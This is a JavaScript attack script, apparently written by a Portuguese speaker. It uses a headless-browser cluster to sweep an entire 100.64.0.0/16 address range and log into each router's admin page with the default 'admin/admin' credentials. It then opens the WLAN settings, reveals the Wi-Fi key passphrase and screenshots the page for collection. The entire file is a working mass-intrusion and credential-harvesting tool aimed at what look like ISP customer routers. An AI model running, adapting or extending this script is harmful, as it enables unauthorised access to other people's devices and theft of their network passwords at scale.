import IPCIDR from "ip-cidr";
import {Cluster} from "puppeteer-cluster";

(async () => {
    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 100,
        monitor: true
    });

    await cluster.task(attack)
    cluster.on('taskerror', (err, data) => {});

    const address = "100.64.0.0/16";
    const cidr = new IPCIDR(address);
    const ips = cidr.toArray({
        from: '100.64.0.2',
        to: '100.64.255.255'
    });
    ips.forEach(ip => {
        cluster.queue(ip)
    });

    await cluster.idle();
    await cluster.close();
})();

async function attack({page, data: ip}) {
    const localpage = page;
    const endereco = `http://${ip}`;

    {
        await localpage.setViewport({
            width: 764,
            height: 928
        })
    }
    {
        await localpage.goto(endereco);
    }
    {
        await localpage.focus('#Frm_Username');
        await localpage.keyboard.type('admin');
    }
    {
        await localpage.focus("#Frm_Password");
        await localpage.keyboard.type("admin")
    }
    {
        await localpage.click("#LoginId")
    }
    {
        await page.waitForTimeout(5000)
        const frame = localpage.frames()
            .filter(frame => frame.url() === `${endereco}/template.gch`)[0]

        await frame.addStyleTag({path: 'style.css'})

        await page.waitForTimeout(250);
        await frame.click("#mmNet");

        await page.waitForTimeout(250);
        await frame.click("#smWLAN");

        await page.waitForTimeout(250);
        await frame.click("#Img_KeyPassphrase")
    }
    {
        const enderecoUrlFoto = endereco
            .replace("http://", "")
            .replace(".", "");

        await localpage.screenshot({
            path: `./fotos/${enderecoUrlFoto}.png`,
            fullPage: true
        })
    }
}

// Modelos de roteadores
async function attackZtePrincipal(page) {

}

